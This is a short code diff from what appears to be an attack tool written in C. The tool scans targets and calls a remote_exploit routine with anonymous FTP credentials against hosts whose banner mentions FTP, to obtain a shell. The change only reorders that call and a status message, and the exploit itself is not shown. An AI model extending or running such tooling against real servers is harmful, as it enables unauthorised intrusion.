@@ -137,8 +137,8 @@ int main(int argc, char *const *argv) {
   if(target_table != NULL) {
     for(target = target_table; target != NULL; target = target->next) {
       if(strstr(target->banner, "FTP") != NULL) {
-        shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");
         fprintf(stdout, "Attacking target \"%s:%u\"...\n", target->address, target->port);
+        shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");
 
         method = rand() % 2;
         if(method == 0) {
